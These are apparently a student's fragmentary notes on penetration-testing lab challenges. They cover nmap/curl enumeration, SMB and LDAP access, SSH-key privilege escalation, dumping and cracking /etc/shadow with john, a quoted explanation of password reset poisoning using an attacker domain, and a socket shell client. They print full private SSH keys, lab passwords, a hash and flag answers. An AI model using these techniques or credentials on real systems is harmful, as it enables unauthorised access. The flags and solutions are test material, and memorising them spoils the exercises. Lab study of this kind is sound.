/><lname>george</lname><uid>1353</uid></User><User><fname>luke</fname><comment /><lname>ursula</lname><uid>1354</uid></User><User><fname>sophie</fname><comment /><lname>yvette</lname><uid>1355</uid></User><User><fname>ian</fname><comment /><lname>ethan</lname><uid>1356</uid></User><User><fname>vincentwilson</fname><comment /><lname>jasmine</lname><uid>1357</uid></User><User><fname>kaylee</fname><comment /><lname>quinn</lname><uid>1358</uid></User><User><fname>emily</fname><comment /><lname>miguel</lname><uid>1359</uid></User><User><fname>oscar</fname><comment /><lname>fiona</lname><uid>1360</uid></User><User><fname>nelson</fname><comment /><lname>charlie</lname><uid>1361</uid></User><User><fname>simon</fname><comment /><lname>hector</lname><uid>1362</uid></User><User><fname>dana</fname><comment /><lname>wendy</lname><uid>1363</uid></User><User><fname>maria</fname><comment /><lname>maria</lname><uid>1364</uid></User><User><fname>irene</fname><comment /><lname>phoebe</lname><uid>1365</uid></User><User><fname>olivia</fname><comment /><lname>xena</lname><uid>1366</uid></User><User><fname>xena</fname><comment /><lname>jasmine</lname><uid>1367</uid></User><User><fname>bridget</fname><comment /><lname>nelson</lname><uid>1368</uid></User><User><fname>felix</fname><comment /><lname>sarah</lname><uid>1369</uid></User><User><fname>frank</fname><comment /><lname>kevin</lname><uid>1370</uid></User><User><fname>miguel</fname><comment /><lname>peter</lname><uid>1371</uid></User><User><fname>emily</fname><comment /><lname>hector</lname><uid>1372</uid></User><User><fname>oscar</fname><comment /><lname>alice</lname><uid>1373</uid></User><User><fname>zoey</fname><comment /><lname>miguel</lname><uid>1374</uid></User><User><fname>xena</fname><comment /><lname>holly</lname><uid>1375</uid></User><User><fname>grace</fname><comment /><lname>sophie</lname><uid>1376</uid></User><User><fname>xena</fname><comment /><lname>clara</lname><uid>1377</uid></User><User><fname>brandon</fname><comment /><lname>holly</lname><uid>1378</uid></User><User><fname>luke</fname><comment /><lname>patrick</lname><uid>1379</uid></User><User><fname>charlie</fname><comment /><lname>frank</lname><uid>1380</uid></User><User><fname>alice</fname><comment /><lname>patrick</lname><uid>1381</uid></User><User><fname>grace</fname><comment /><lname>oscar</lname><uid>1382</uid></User><User><fname>diego</fname><comment /><lname>sarah</lname><uid>1383</uid></User><User><fname>quade</fname><comment /><lname>victoria</lname><uid>1384</uid></User><User><fname>lilly</fname><comment /><lname>yuri</lname><uid>1385</uid></User><User><fname>quade</fname><comment /><lname>luke</lname><uid>1386</uid></User><User><fname>lana</fname><comment /><lname>phoebe</lname><uid>1387</uid></User><User><fname>charlie</fname><comment /><lname>patrick</lname><uid>1388</uid></User><User><fname>diego</fname><comment /><lname>ursula</lname><uid>1389</uid></User><User><fname>kaylee</fname><comment /><lname>frank</lname><uid>1390</uid></User><User><fname>zoey</fname><comment /><lname>vincentwilson</lname><uid>1391</uid></User><User><fname>wendy</fname><comment /><lname>quade</lname><uid>1392</uid></User><User><fname>fiona</fname><comment /><lname>grace</lname><uid>1393</uid></User><User><fname>bridget</fname><comment /><lname>ian</lname><uid>1394</uid></User><User><fname>hector</fname><comment /><lname>simon</lname><uid>1395</uid></User><User><fname>ivan</fname><comment /><lname>george</lname><uid>1396</uid></User><User><fname>clara</fname><comment /><lname>hector</lname><uid>1397</uid></User><User><fname>fiona</fname><comment /><lname>quinn</lname><uid>1398</uid></User><User><fname>james</fname><comment /><lname>miguel</lname><uid>1399</uid></User><User><fname>vincentwilson</fname><comment /><lname>grace</lname><uid>1400</uid></User><User><fname>ivan</fname><comment /><lname>marcus</lname><uid>1401</uid></User><User><fname>jane</fname><comment /><lname>alice</lname><uid>1402</uid></User><User><fname>raina</fname><comment /><lname>henry</lname><uid>1403</uid></User><User><fname>alice</fname><comment /><lname>jasmine</lname><uid>1404</uid></User><User><fname>kaylee</fname><comment /><lname>maria</lname><uid>1405</uid></User><User><fname>thomas</fname><comment /><lname>sarah</lname><uid>1406</uid></User><User><fname>trinity</fname><comment /><lname>trinity</lname><uid>1407</uid></User><User><fname>grace</fname><comment /><lname>hector</lname><uid>1408</uid></User><User><fname>alice</fname><comment /><lname>marcus</lname><uid>1409</uid></User><User><fname>diego</fname><comment /><lname>frank</lname><uid>1410</uid></User><User><fname>sarah</fname><comment /><lname>marcus</lname><uid>1411</uid></User><User><fname>quade</fname><comment /><lname>vincentwilson</lname><uid>1412</uid></User><User><fname>felix</fname><comment /><lname>ulysses</lname><uid>1413</uid></User><User><fname>nelson</fname><comment /><lname>olivia</lname><uid>1414</uid></User><User><fname>thomas</fname><comment /><lname>emily</lname><uid>1415</uid></User><User><fname>amelia</fname><comment /><lname>patrick</lname><uid>1416</uid></User><User><fname>quinn</fname><comment /><lname>phoebe</lname><uid>1417</uid></User><User><fname>james</fname><comment /><lname>frank</lname><uid>1418</uid></User><User><fname>james</fname><comment /><lname>henry</lname><uid>1419</uid></User><User><fname>ian</fname><comment /><lname>kaylee</lname><uid>1420</uid></User><User><fname>grace</fname><comment /><lname>xavier</lname><uid>1421</uid></User><User><fname>robert</fname><comment /><lname>patrick</lname><uid>1422</uid></User><User><fname>lilly</fname><comment /><lname>george</lname><uid>1423</uid></User><User><fname>holly</fname><comment /><lname>simon</lname><uid>1424</uid></User><User><fname>taylor</fname><comment /><lname>maria</lname><uid>1425</uid></User><User><fname>yuri</fname><comment /><lname>wendy</lname><uid>1426</uid></User><User><fname>frank</fname><comment /><lname>xavier</lname><uid>1427</uid></User><User><fname>diego</fname><comment /><lname>grace</lname><uid>1428</uid></User><User><fname>zoey</fname><comment /><lname>holly</lname><uid>1429</uid></User><User><fname>henry</fname><comment /><lname>marcus</lname><uid>1430</uid></User><User><fname>sophie</fname><comment /><lname>jane</lname><uid>1431</uid></User><User><fname>yuri</fname><comment /><lname>yvette</lname><uid>1432</uid></User><User><fname>lilly</fname><comment /><lname>ursula</lname><uid>1433</uid></User><User><fname>olivia</fname><comment /><lname>kevin</lname><uid>1434</uid></User><User><fname>ian</fname><comment /><lname>quinn</lname><uid>1435</uid></User><User><fname>irene</fname><comment /><lname>kaylee</lname><uid>1436</uid></User><User><fname>taylor</fname><comment /><lname>hector</lname><uid>1437</uid></User><User><fname>clara</fname><comment /><lname>trinity</lname><uid>1438</uid></User><User><fname>alexander</fname><comment /><lname>miguel</lname><uid>1439</uid></User><User><fname>bob</fname><comment /><lname>wendy</lname><uid>1440</uid></User><User><fname>robert</fname><comment /><lname>quade</lname><uid>1441</uid></User><User><fname>ursula</fname><comment /><lname>zoey</lname><uid>1442</uid></User><User><fname>wendy</fname><comment /><lname>luke</lname><uid>1443</uid></User><User><fname>trinity</fname><comment /><lname>amelia</lname><uid>1444</uid></User><User><fname>olivia</fname><comment /><lname>vincentwilson</lname><uid>1445</uid></User><User><fname>kaylee</fname><comment /><lname>natalie</lname><uid>1446</uid></User><User><fname>henry</fname><comment /><lname>ursula</lname><uid>1447</uid></User><User><fname>ulysses</fname><comment /><lname>maria</lname><uid>1448</uid></User><User><fname>xavier</fname><comment /><lname>kaylee</lname><uid>1449</uid></User><User><fname>jane</fname><comment /><lname>zoey</lname><uid>1450</uid></User><User><fname>peter</fname><comment /><lname>victoria</lname><uid>1451</uid></User><User><fname>xena</fname><comment /><lname>bob</lname><uid>1452</uid></User><User><fname>xena</fname><comment /><lname>james</lname><uid>1453</uid></User><User><fname>george</fname><comment /><lname>clara</lname><uid>1454</uid></User><User><fname>felix</fname><comment /><lname>zoey</lname><uid>1455</uid></User><User><fname>jasmine</fname><comment /><lname>dana</lname><uid>1456</uid></User><User><fname>ian</fname><comment /><lname>fiona</lname><uid>1457</uid></User><User><fname>yuri</fname><comment /><lname>alice</lname><uid>1458</uid></User><User><fname>marcus</fname><comment /><lname>george</lname><uid>1459</uid></User><User><fname>clara</fname><comment /><lname>peter</lname><uid>1460</uid></User><User><fname>sarah</fname><comment /><lname>brandon</lname><uid>1461</uid></User><User><fname>nathan</fname><comment /><lname>sophie</lname><uid>1462</uid></User><User><fname>james</fname><comment /><lname>olivia</lname><uid>1463</uid></User><User><fname>lilly</fname><comment /><lname>alice</lname><uid>1464</uid></User><User><fname>alice</fname><comment /><lname>charlie</lname><uid>1465</uid></User><User><fname>robert</fname><comment /><lname>clara</lname><uid>1466</uid></User><User><fname>nelson</fname><comment /><lname>lilly</lname><uid>1467</uid></User><User><fname>luke</fname><comment /><lname>ursula</lname><uid>1468</uid></User><User><fname>zander</fname><comment /><lname>kaylee</lname><uid>1469</uid></User><User><fname>irene</fname><comment /><lname>irene</lname><uid>1470</uid></User><User><fname>quade</fname><comment /><lname>yuri</lname><uid>1471</uid></User><User><fname>holly</fname><comment /><lname>jane</lname><uid>1472</uid></User><User><fname>clara</fname><comment /><lname>irene</lname><uid>1473</uid></User><User><fname>thomas</fname><comment /><lname>victoria</lname><uid>1474</uid></User><User><fname>charlie</fname><comment /><lname>luke</lname><uid>1475</uid></User><User><fname>ethan</fname><comment /><lname>nathan</lname><uid>1476</uid></User><User><fname>amelia</fname><comment /><lname>ethan</lname><uid>1477</uid></User><User><fname>quade</fname><comment /><lname>oscar</lname><uid>1478</uid></User><User><fname>oscar</fname><comment /><lname>miguel</lname><uid>1479</uid></User><User><fname>quinn</fname><comment /><lname>dana</lname><uid>1480</uid></User><User><fname>olivia</fname><comment /><lname>yvette</lname><uid>1481</uid></User><User><fname>kaylee</fname><comment /><lname>yvette</lname><uid>1482</uid></User><User><fname>ian</fname><comment /><lname>george</lname><uid>1483</uid></User><User><fname>bridget</fname><comment /><lname>george</lname><uid>1484</uid></User><User><fname>grace</fname><comment /><lname>felix</lname><uid>1485</uid></User><User><fname>nathan</fname><comment /><lname>marcus</lname><uid>1486</uid></User><User><fname>fiona</fname><comment /><lname>fiona</lname><uid>1487</uid></User><User><fname>emily</fname><comment /><lname>jasmine</lname><uid>1488</uid></User><User><fname>thomas</fname><comment /><lname>hector</lname><uid>1489</uid></User><User><fname>olivia</fname><comment /><lname>ursula</lname><uid>1490</uid></User><User><fname>wendy</fname><comment /><lname>patrick</lname><uid>1491</uid></User><User><fname>hector</fname><comment /><lname>zoey</lname><uid>1492</uid></User><User><fname>thomas</fname><comment>36</comment><lname>kevin</lname><uid>1493</uid></User></Visitor>


```








# Examining Server
Exercises
For this challenge, you're given an IP address of a server on the external network, and are tasked to examine it. Enumerate the server carefully and thoroughly, as well as any services that are running on this server, in order to get the flag.

Hint: If your tools tell you something odd about a server or a service, but doesn't give enough information about it, many tools support the use of the -v switch to output the tool results with more verbosity.
```sh
                                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ nmap 192.168.153.117 -vvvvv -sC -sV
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-15 19:45 AEST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:45
Completed NSE at 19:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:45
Completed NSE at 19:45, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:45
Completed NSE at 19:45, 0.00s elapsed
Initiating Ping Scan at 19:45
Scanning 192.168.153.117 [2 ports]
Completed Ping Scan at 19:45, 0.25s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:45
Completed Parallel DNS resolution of 1 host. at 19:45, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 19:45
Scanning 192.168.153.117 [1000 ports]
Discovered open port 8008/tcp on 192.168.153.117
Increasing send delay for 192.168.153.117 from 0 to 5 due to max_successful_tryno increase to 4
Completed Connect Scan at 19:46, 30.40s elapsed (1000 total ports)
Initiating Service scan at 19:46
Scanning 1 service on 192.168.153.117
Completed Service scan at 19:46, 6.50s elapsed (1 service on 1 host)
NSE: Script scanning 192.168.153.117.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:46
Completed NSE at 19:46, 4.88s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:46
Completed NSE at 19:46, 0.98s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:46
Completed NSE at 19:46, 0.00s elapsed
Nmap scan report for 192.168.153.117
Host is up, received conn-refused (0.24s latency).
Scanned at 2023-06-15 19:45:58 AEST for 42s
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE REASON  VERSION
8008/tcp open  http    syn-ack Apache httpd 2.4.54 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.54 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:46
Completed NSE at 19:46, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:46
Completed NSE at 19:46, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:46
Completed NSE at 19:46, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.45 seconds
                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.153.117:8008                                              



<b>Nothing to see here...unless you aren't verbose enough.?</b>
                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.153.117:8008 -v 
*   Trying 192.168.153.117:8008...
* Connected to 192.168.153.117 (192.168.153.117) port 8008 (#0)
> GET / HTTP/1.1
> Host: 192.168.153.117:8008
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Thu, 15 Jun 2023 09:47:38 GMT
< Server: Apache/2.4.54 (Debian)
< Header-Flag: OS{16657125cbf8f83678607b36e7000ca1}
< Content-Length: 67
< Content-Type: text/html; charset=UTF-8
< 



<b>Nothing to see here...unless you aren't verbose enough.?</b>
* Connection #0 to host 192.168.153.117 left intact
                                                                       

```





# SMB Access
Exercises
This challenge instance contains the flag located inside the flag.txt file on an SMB share listening on the default SMB port. The SMB share is password-protected with a username of smbusr and a password of givemetheflag. You can access the SMB share directly from your kali linux instance.

```sh

smbclient 
smbclient //<SMB_Server>/<Share> -U smbusr%givemetheflag



┌──(kali㉿kali)-[~]
└─$ smbmap -H 192.168.153.115 -u smbusr -p givemetheflag



┌──(kali㉿kali)-[~/smb]
└─$ smbclient //192.168.195.115/tryharder -U smbusr%givemetheflag
Try "help" to get a list of possible commands.
smb: \> get flag.txxt
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \flag.txxt
smb: \> get flag.txt
getting file \flag.txt of size 37 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> exit

```








# LDAP Enumeration
Exercises
There's an LDAP server on the remote server that contains some user information about the remote system. Enumerate the users in the LDAP database on the remote server to get the flag.

```sh
ldapsearch -x -b "dc=offsec,dc=local" -H ldap://192.168.153.115

```







# SSH Keys
Exercises
There is a program located on the remote system named /home/student/set_keys which will copy an ssh key to a list of authorized keys, allowing you to escalate privileges.

Further information about this challenge is available under /home/student/CHALLENGE_README.md. Figure out how to escalate your privileges to get the flag.

```sh
┌──(student㉿5b1a62be3892)-[~]
└─$ cat CHALLENGE_README.md 
For this challenge, you need to get access to xavier's user account to retrieve the flag, located at /home/xavier/flag.txt.
There is a binary located at /home/student/set_keys which will write the contents of /home/student/exported-key (if the file exists)
 to the /home/xavier/.ssh/authorized_keys file which may help you get access to xavier's user account.


exported-key generated under web100 

copy to exported-key to /home/student/exported-key
run bin /home/student/set_keys

ssh -p 2222 xavier@192.168.195.115 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i ./examkey





could also try
ssh-keygen -t ed25519 -C "xavier@offsec.local"



```



#### ################################################################################################################

# Finding and Copying Files
Exercises
There is a zip file named flag.zip that contains the flag. However, the zip file is password protected. There is another file named password.png hidden somewhere on the system, which contains the password. Find this image, copy it off the system, and then view it to get the password. Then, unzip the zip file with the password to get the flag.
```sh
$ find / -name *.png   
/usr/share/fonts/password.png

#CONVERT IMG TO BASE64 FOR EXFIL
echo -n "<html><body><img src='data:image/png;base64,$(cat input_image.png | base64 | tr -d '\r\n')' /></body></html>" > outputimage.txt
#   TO VIEW
myImgStr=(cat output_image.txt)
echo "$myImgStr" | base64 -d > output_image.png
#   OR
<html><body>
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAgAAAAIACAYAAAD0eNT ...">
</body></html>

```



# Web Logs
Exercises
The system administrator thinks there may be an attacker on the following server who's been regularly making requests onto the local web server. You've been given enough privileges to investigate this issue. Find the file that the attacker has been requesting, and view the file to get the flag.
```
cat /var/log/apache2/access.log
curl http://127.0.0.1/
```



# Mystery Function
Exercises
This PowerShell session that's running on this system has a strange function loaded into it. SSH into the system, determine what the function is, and run it to get the flag.

Hint: You may want to look at PowerShell providers first.
```sh
Get-Command -ListImported
```


# Mystery Module
Exercises
There is a mysterious PowerShell module that's installed and made available to use on this system. SSH into the system, identify the PowerShell module, and find out how to run its commands to get the flag.
```sh
get-module -ListAvailable [expects a flag]        Get-Command -Module <ModuleName>
```


# Finding Flag
Exercises
The flag has been hidden somewhere on the file system. However, the file has the extension of .flag. Use this knowledge to find the flag and get read its contents.

```sh
cd c:/ 

dir *.flag /s /p

```




# 3 Elevating access
sudo su

# 5



# Apache log parsing
#!/usr/bin/env python3
import sys
import shlex #only needed if apachelogs cannot be pip'd

"""
You may want to create desired functions here.
"""

if __name__ == "__main__":

    """
    You may want to do the file operations here.
    """
    inputFile = sys.argv[1]
    outputFile = sys.argv[2]
    output = []
    with open(inputFile, 'r') as fp:
        for line in fp:
            item = shlex.split(line)
            if (item[6] == "200"):
                #print (item[0])
                output.append(item[0])

    with open(outputFile, 'w') as fp:
        for item in output:
            # write each item on a new line
            fp.write("%s\n" % item)


# 12
    troubleshooting.py

# 13 SSH KEY
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----



# sensitive files
robots.txt

User-agent: *
Disallow: /challenge_flag_document_7ab29c0df6fb/

```sh
└─$ curl -v -X OPTIONS http://192.168.207.118/challenge_flag_document_a4f19f59da76/
*   Trying 192.168.207.118:80...
* Connected to 192.168.207.118 (192.168.207.118) port 80 (#0)
> OPTIONS /challenge_flag_document_a4f19f59da76/ HTTP/1.1
> Host: 192.168.207.118
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Fri, 02 Jun 2023 23:59:08 GMT
< Server: gunicorn/20.0.4
< Content-Type: text/html; charset=utf-8
< Content-Length: 0
< Allow: OPTIONS, GETFLAG
< Cache-Control: public, max-age=0
< Pragma: no-cache
< Expires: 0
< 
* Connection #0 to host 192.168.207.118 left intact





curl -v -X GETFLAG http://192.168.207.118/challenge_flag_document_7ccca127dc06/


```



# buggy calculator
buggy_calculator.js
./challenge -v works

# js primes
    jsprimes.js


# cracking shadow
student:$6$OFibVB8yjQyu9.wQ$x5r/0T6po6RCiJHAz.6Nd8O4RzzahkxGSHkOK9o9gh3CErYAf6MYUyaL4RX/l9q/mmx6f5nBk4XnIzOLGVILj.:19312:0:99999:7:::

cat /etc/passwd >> passwd.txt
cat /etc/shadow >> shadow.txt
unshadow passwd.txt shadow.txt > passwords.txt
john --wordlist=/home/student/rockyou_top_1k.txt passwords.txt


# rot13
cat /usr/local/games/unbreakable_flag.txt
BF{38qrqn4rrs1rrp3o1384oos7sornn2qq}


# auth bypass
dirb http://10.10.10.176

For an application assessment against this web server, we are given access to the guest account of the website, with a username of "guest" and a password of "guest".
However, this account isn't privileged. Find a way to escalate privileges to the web administrator's account to get the flag.
The web service is available on your instance on port 80.






# secure file uploads
/code/app/main.py
For this challenge, you will need to modify the code in /code/app/main.py to make it more secure.

Right now, the python web server within the /code/app/main.py file contains a file upload functionality, allowing users to upload files and view their uploaded files.
However, even though the webpage itself states that only txt and mp3 file extensions are accepted, in reality the server will upload any file, even those with invalid file extensions.

Your task is to modify the /code/app/main.py file so that only files with the txt and mp3 extensions are uploaded. Make sure to only add the code in the specified area of the /code/app/main.py file.
There is a /code/app/main.py.backup file which contains the original main.py file contents if you want to start over.

Once you think you have a working implementation, start the webserver by running `/usr/local/bin/python3 /code/app/main.py`. Then, in another SSH session, run the checker binary located at 
`/home/student/check_solution`. If everything is configured properly, then you should be able to get the flag!

student@b023dd8d2300:~$ cat CHALLENGE_README 
For this challenge, you will need to modify the code in /code/app/main.py to make it more secure.

Right now, the python web server within the /code/app/main.py file contains a file upload functionality, allowing users to upload files and view their uploaded files.
However, even though the webpage itself states that only bmp and mp3 file extensions are accepted, in reality the server will upload any file, even those with invalid file extensions.

Your task is to modify the /code/app/main.py file so that only files with the bmp and mp3 extensions are uploaded. Make sure to only add the code in the specified area of the /code/app/main.py file.
There is a /code/app/main.py.backup file which contains the original main.py file contents if you want to start over.

Once you think you have a working implementation, start the webserver by running `/usr/local/bin/python3 /code/app/main.py`. Then, in another SSH session, run the checker binary located at 
`/home/student/check_solution`. If everything is configured properly, then you should be able to get the flag!




```py
        file_name, file_extension = os.path.splitext(filename)
        a = file_extension.lower()
        print (a)
        #if ext != ".exe" and ext != ".mp4":
        #    exit
        if a == ".bmp" or a == ".mp3":
            print("safe")
        else :
            print("bad")
            exit()
```



# web enumeration
Use the provided website functionality to determine a valid user for the login portal. Then, use the password reset link on the valid user to obtain the flag.


        https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning 
        How to construct a password reset poisoning attack
        If the URL that is sent to the user is dynamically generated based on controllable input, such as the Host header, it may be possible to construct a password reset poisoning attack as follows:

        The attacker obtains the victim's email address or username, as required, and submits a password reset request on their behalf. When submitting the form, they intercept the resulting HTTP request and modify the Host header so that it points to a domain that they control. For this example, we'll use evil-user.net.
        The victim receives a genuine password reset email directly from the website. This seems to contain an ordinary link to reset their password and, crucially, contains a valid password reset token that is associated with their account. However, the domain name in the URL points to the attacker's server:

        https://evil-user.net/reset?token=ssh
        If the victim clicks this link (or it is fetched in some other way, for example, by an antivirus scanner) the password reset token will be delivered to the attacker's server.
        The attacker can now visit the real URL for the vulnerable website and supply the victim's stolen token via the corresponding parameter. They will then be able to reset the user's password to whatever they like and subsequently log in to their account.


f.garcia@genesissystems.com

```sh
just try entering the email address and clicking reset password

```


# network technologies
What is the address of the next hop for any traffic sent to the IP address 8.8.8.8 from the below instance using Classless Inter-Domain Routing (CIDR) notation?
Note: This instance does not have internet connectivity so you can not actually communicate with this IP address. You will need to use its active network configuration to determine the answer.
Use the provided /home/student/challenge binary to check your answer and get the flag.
```sh


route
172.16.171.0/29

Using CIDR notation, what is the the next hop address for any traffic sent to 8.8.8.8?
172.16.171.1/29

You entered:
172.16.171.1/29

Great job. Here is your flag:
OS{f358de3142a9c026567e571b9657307d}

```


# remote access client
This machine has an internal login shell server that is listening on the local interface port 5000. Write a python3 client to interact with the login shell server to execute commands and get the flag located in /home/challenge/flag.txt. Note: There may or may not be a prompt to guide you once the shell connection is established. The required username and password combination to authenticate to the internal login shell server is listed under /home/student/creds.txt.

Hint 1: If the login shell server is listening internally on the local interface, which IP address should your client connect to?

Hint 2: The python socket recv() function stops receiving data when it receives a newline character. You may want to do multiple recv() calls after sending data in order to get all the output from the server.
```py
#!/usr/bin/python3
import socket
import time
import telnetlib
def interact(socket):
    t = telnetlib.Telnet()
    t.sock = socket
    t.interact()
sockFamily= socket.AF_INET
#The socket.SOCK_STREAM is used to create a socket for TCP and socket.SOCK_DGRAM for UDP. 
sockType = socket.SOCK_STREAM
host = "localhost"
port = 5000
with socket.socket(sockFamily, sockType) as client:
    client.connect((host,port))
    msg = client.recv(1024)
    print (msg.decode('ascii'))
    interact(client)


```
Username: nelson
Password: woo53Tey3




# ssh login keys

There is a second user on the target system. Find a way to log in as the second user, and retrieve the flag from that user's home directory.

You can connect to your instance with the following SSH credentials:

-----BEGIN OPENSSH PRIVATE KEY-----id
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAnJ6+KvhaUWIq9LH/p+5FKafkGZ4CDFnkLWxU08YWJxXPW6kGr239
SOzv1QAFmjxrahrtZZBIdsVvx6vpDqtYTG0NuCfyS6/PnMW3TzJt5+o4lnWXWzDBDMZ2F9
aS7K9VlnQmXCRMNTeEdSFGmPNr4EMNDahaSSdswDwKbgfymVCFZgilFAAUiabelN4DOntv
Vq+ZsihfVBzZnX99ojfC6w8Gn5RQsK3b6YtbUsH6+rQeapNSUqZJa/KTfER4wqs4uZVk3s
Zc+DM31j2INX6h4d7tk/8CoBsx/yF+pdw11NsiyN2ysDzO+u+nb4lmsAHknGCJOgNUNXuJ
xs00oampT6OkSkjIVqUYj6fXZKyHyMSqMJp4GnidylHHwNPHQfQhodG7ssVh9Ng6YUOFdV
